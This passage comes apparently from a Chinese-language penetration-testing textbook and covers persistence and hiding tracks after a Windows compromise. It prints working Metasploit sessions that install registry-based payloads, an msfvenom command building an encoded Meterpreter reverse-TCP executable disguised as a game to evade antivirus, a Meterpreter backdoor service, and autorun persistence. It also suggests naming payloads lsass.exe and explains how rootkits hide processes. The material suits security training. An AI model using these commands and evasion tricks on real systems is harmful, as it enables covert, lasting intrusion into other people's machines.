
攻击者仍然可以在他们想要的时候进入系统。有几种技术可以做到这一点。如果系统有远程访问，例如安全外壳 (SSH) 或 Windows 系统上的远程桌面，攻击者可能只需创建一个具有远程登录能力的新用户。如果受攻破的用户更改了密码或用户帐户被删除，新用户将可供攻击者使用。

另一种选择是安装会主动连接到攻击者系统的软件。这通常是最佳方法，因为可能已部署防火墙来阻止入站连接尝试，但出站连接通常被允许。因此，我们可以安装一个反向 shell 包，如果我们有侦听器在等待，它就会连接回我们的系统。在下一个代码清单中，您可以看到从 Meterpreter 会话开始，并安装一个在用户登录时启动的程序。这种特定的持久化机制使用注册表来存储有效载荷。注册表中 HKEY_CURRENT_USER 下的 Run 键随后被加载以调用有效载荷。

### Registry persistence from Metasploit

```
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/http/manageengine_connectionid_write) > use exploit/windows/local/registry_persistence
msf exploit(windows/local/registry_persistence) > set SESSION 1
SESSION => 1
msf exploit(windows/local/registry_persistence) > exploit

[*] Generating payload blob..
[+] Generated payload, 5968 bytes
[*] Root path is HKCU
[*] Installing payload blob..
[+] Created registry key HKCU\Software\h02pqzTh
[+] Installed payload blob to HKCU\Software\h02pqzTh\kASCvdw3
[*] Installing run key
```

此过程使用注册表存储可执行二进制数据块，且无法控制存储和执行的内容。您也可以创建自己的可执行文件并应用注册表技术。您只能无法使用上面显示的模块。要创建独立的可执行文件，可以使用 Metasploit 的一部分 msfvenom 程序。在下一个代码清单中，您可以看到 msfvenom 运行示例。这采用了 windows/meterpreter/reverse_tcp 有效载荷，它会将连接发送回指定 IP 地址上的 Meterpreter shell。

## 使用 msfvenom 创建独立有效载荷

```
root@quiche:~# msfvenom -p windows/meterpreter/reverse_tcp
LHOST=192.168.86.57 LPORT=3445 -f exe -e x86/shikata_ga_nai -a x86 -i 3 -o
elfbowling.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows
from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of exe file: 73802 bytes
Saved as: elfbowling.exe
root@quiche:~# ls -la elfbowling.exe
-rw-r--r-- 1 root root 73802 Sep 12 17:58 elfbowling.exe
```

命令行参数中看到的大部分内容都相当简单。我们正在为 x86 32 位 Windows 系统创建一个 .exe 文件。有效载荷将连接到 192.168.86.57 的 3445 端口。要在目标系统上使用 Meterpreter，您需要启动一个侦听器。作为对几十年前几款傻乎乎游戏的致敬，我将其命名为 elfbowling.exe。也许看到它的人不会多想。除了将有效载荷封装为符合可移植可执行格式的 .exe 文件外，该 .exe 还经过编码。编码的目的是隐藏它以躲避防病毒程序。

创建持久连接还有其他方法。另一种是使用 Metsvc。这是 Meterpreter 服务。它默认在端口 31337 上创建一个侦听器，可以连接到它以获取 Meterpreter shell。您会注意到 Metasploit 提到 Meterpreter 脚本已弃用。相反，我们应该加载模块并使用它们。不过，目前 Meterpreter 服务仍然可用，可以用于获取访问权限，只要您能通过可能存在的任何防火墙连接到指定端口即可。

## 在目标上创建 Meterpreter 服务

```
meterpreter > run metsvc
[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Windows\SERVC~2\LOCALS~1\
AppData\Local\Temp\KrUJwjIQb... [*] >>> Uploading metsrv.x86.dll...
[*] >>> Uploading metsvc-server.exe...
[*] >>> Uploading metsvc.exe...
[*] Starting the service...
```

如所述，Meterpreter 服务期望您能够进行入站连接。此外，Meterpreter 服务脚本已弃用，可能很快会从 Metasploit 中删除。相反，我们可以使用 Metasploit 指向我们的模块。在下一个代码清单中，您将看到该模块的用法。它要求您有一个可上传并安装到目标系统的可执行文件。此处提供的是上面有效载荷创建的输出。这是从 msfvenom 创建的反向 Meterpreter 可执行文件。您将看到 Meterpreter 将有效载荷上传到目标系统并创建持久化可执行文件。随后会创建注册表项，以便在用户登录时自动运行持久化可执行文件。您可以从对 HKCU 的引用中看到这一点，HKCU 是 HKEY_CURRENT_USER，即注册表中与已登录用户相关的所有内容的位置。

## 使用 Metasploit 模块进行持久化

```
meterpreter > run post/windows/manage/persistence_exe REXEPATH=/root/elfbowling.exe

[*] Running module against VAGRANT-2008R2
[*] Reading Payload from file /root/elfbowling.exe
[*] Persistent Script written to C:\Windows\SERVC~2\LOCALS~1\AppData\Local\Temp\default.exe
[*] Executing script C:\Windows\SERVC~2\LOCALS~1\AppData\Local\Temp\default.exe
[+] Agent executed with PID 5672
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qWQPRsRzw
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/VAGRANT-2008R2_20180912.4749/VAGRANT-2008R2_20180912.4749.rc
```

这为我们提供了许多在初始入口点之后保留对目标系统访问权限的方式。不过，您可能已注意到，这些持久化机制会在目标系统中引入文件和注册表项。这些操作和痕迹可能会被检测到，前提是终端上有检测机制，或者有人在关注终端上的活动。这是一个需要考虑的问题。在调查终端时，您可能会注意到目标上是否存在恶意软件检测或其他类型的检测软件。

## 隐藏痕迹

每次作为渗透测试或安全评估的一部分获得对系统的访问权限时，您都会留下足迹。登录系统的行为会留下日志条目。可能需要留在系统上的任何文件或其他痕迹都有被定位并标记为恶意的潜在风险。这意味着您的行为可能会被调查，您的立足点可能会被移除。您将不得不面对一个为您设置了更多障碍的目标，从头再来。这意味着您需要尽力掩盖自己的存在，变得擅长隐藏痕迹。

不过，隐藏和覆盖痕迹有很多方面。首先，一旦您获得对系统的访问权限，很可能正在创建日志。日志可能需要进行调整。您可能需要创建文件。例如，您想在目标系统上放置一个有效载荷。这通常意味着文件系统上有一个文件。您需要一个好方法来隐藏放置在系统上的任何文件。一旦您有了可执行文件，您就会想要运行它。这意味着进程表中会有进程正在执行的证据。任何查看进程表的人都会看到它，这会引起一些调查，即使只是用户在四处窥探。

有时候掩盖痕迹会带来一点模糊性。您会让某事变得稍微难以找到或理解。这有点像试图在开阔的田野里藏起来。您需要尽力掩盖自己，但有人仔细寻找仍然会找到您。

### Rootkit

坦率地说，进程表是最难处理的痕迹。原因是进程表存储在内核空间中。要对进程表做任何事情，您需要能够模糊内核空间中的内容。在大多数现代操作系统中，安全和特权方面存在环模型。您可以获得的最高权限级别是 ring 0，这意味着您处于内核空间。内核需要对系统拥有完全控制权，因为它与硬件交互。操作环境中的其他任何部分都不像内核那样与硬件或如此多的组件进行交互。

与内核交互是通过应用程序编程接口 (API) 完成的。请求通过 API 发送到内核，内核执行请求并将结果返回给发出请求的进程。这意味着，要操作内核空间中的任何内容（例如进程表），您需要通过现有 API 函数向内核发出请求，或者您需要处于内核空间。由于从内核外部操作进程表的唯一方法是创建和终止进程，您实际上无法从内核以外的任何地方隐藏进程的存在。

攻击者通常会使用一组称为 rootkit 的软件来操纵用户所能看到的内容。rootkit 可能包含一个内核模式模块或驱动程序，用于过滤进程表结果。该 rootkit 需要知道随 rootkit 附带的进程的名称或属性，以便可以将其过滤掉。rootkit 还可能包含替换二进制文件，同样过滤文件列表结果，因此任何使用系统二进制文件的人都不会知道文件系统中存在与感染/攻破相关的文件。

不幸的是，rootkit 并不是 Metasploit 或其他攻击工具自带的功能。相反，Metasploit 使用进程编码等策略来躲避恶意软件扫描器，使这些扫描器更难识别您注入的软件。除此之外，如果您能控制正在运行的可执行文件的名称，将其改为不引起怀疑的名称可以帮助保护进程。例如，如果您将其命名为 lsass.exe，任何查看的人都会看到它并不以为意，因为这是 Windows 系统上常见的进程。
